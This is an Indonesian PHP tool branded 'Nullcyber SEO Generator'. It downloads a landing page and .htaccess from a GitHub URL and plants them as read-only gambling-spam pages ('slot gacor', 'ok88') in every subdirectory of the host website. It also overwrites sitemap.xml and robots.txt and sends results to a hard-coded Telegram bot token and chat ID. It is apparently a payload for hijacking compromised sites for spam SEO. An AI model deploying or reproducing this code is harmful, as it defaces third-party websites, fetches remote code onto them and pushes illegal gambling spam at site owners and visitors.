<?php
$keywords = [
    'ok88', 'ok88-gacor', 'ok88-slotgacor', 'ok88-gambler', 'ok88-online-kasino',
    'slot-gacor-hari-ini', 'link-slot-gacor-terpercaya', 'slot-bonus-new-member',
    'rtp-slot-tertinggi', 'slot-gacor-pragmatic'
];

$landingUrl  = "https://raw.githubusercontent.com/Cnull00/file_file/refs/heads/main/landing.php";
$htaccessUrl = "https://raw.githubusercontent.com/Cnull00/file_file/refs/heads/main/.htaccess.txt";

$telegramToken = '8481177639:AAGRYKPlQxr1PXcMqHgBTQo3MmmSkv_iI7w';
$chatId = '1883446251';

function sendTelegram($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message];
    @file_get_contents($url . '?' . http_build_query($data));
}

function generateAll($keywords, $landingUrl, $htaccessUrl) {
    $baseDir = __DIR__;
    $dirs = array_filter(glob($baseDir . '/*'), 'is_dir');
    $validUrls = [];

    // Ambil isi dari GitHub
    $landingContent  = @file_get_contents($landingUrl);
    $htaccessContent = @file_get_contents($htaccessUrl);

    if (!$landingContent || !$htaccessContent) {
        die("Gagal ambil konten dari GitHub. Periksa URL.");
    }

    foreach ($dirs as $dir) {
        $nseoPath = $dir . '/nseo';
        if (!file_exists($nseoPath)) mkdir($nseoPath, 0777, true);

        foreach ($keywords as $slug) {
            $targetFolder = "$nseoPath/$slug";
            if (!file_exists($targetFolder)) mkdir($targetFolder, 0777, true);

            $title = ucwords(str_replace('-', ' ', $slug));
            $phpPage = str_replace('{{title}}', $title, $landingContent);

            // Simpan index.php dan htaccess
            file_put_contents("$targetFolder/index.php", $phpPage);
            file_put_contents("$targetFolder/.htaccess", $htaccessContent);

            // Lock permission
            chmod("$targetFolder/index.php", 0444);
            chmod("$targetFolder/.htaccess", 0444);

            // Cek jika URL valid (200 OK)
            $dirName = basename($dir);
            $url = "https://" . $_SERVER['HTTP_HOST'] . "/$dirName/nseo/$slug/";
            $headers = @get_headers($url);
            if ($headers && strpos($headers[0], '200') !== false) {
                $validUrls[] = $url;
            }
        }
    }

    // Buat sitemap
    $sitemap = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
    $sitemap .= "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";
    foreach ($validUrls as $url) {
        $sitemap .= "<url>\n<loc>$url</loc>\n<lastmod>" . date("Y-m-d") . "</lastmod>\n<changefreq>daily</changefreq>\n<priority>1.0</priority>\n</url>\n";
    }
    $sitemap .= "</urlset>";
    file_put_contents($baseDir . '/sitemap.xml', $sitemap);

    // robots.txt auto-generate
    $robots = "User-agent: *\nAllow: /\nSitemap: https://" . $_SERVER['HTTP_HOST'] . "/sitemap.xml";
    file_put_contents($baseDir . '/robots.txt', $robots);

    return count($validUrls);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $count = generateAll($keywords, $landingUrl, $htaccessUrl);
    sendTelegram($telegramToken, $chatId, "✅ $count halaman SEO aktif!\nSitemap: https://" . $_SERVER['HTTP_HOST'] . "/sitemap.xml");
    echo "<script>alert('Generate sukses! Total $count halaman aktif');window.location='index.php';</script>";
    exit;
}
?>

<!-- === GUI HTML === -->
<!DOCTYPE html>
<html>
<head>
    <title>Landing Generator - Nullcyber</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0d0d0d;
            color: #eee;
            text-align: center;
            padding-top: 80px;
        }
        .container {
            background: #181818;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 0 15px #0f0;
            display: inline-block;
        }
        h1 {
            color: #0f0;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 35px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
        }
        p {
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🧠 Nullcyber SEO Generator</h1>
        <p>Generate landing page terenkripsi + htaccess + sitemap otomatis</p>
        <form method="POST">
            <button type="submit">🚀 Jalankan Generator</button>
        </form>
    </div>
</body>
</html>
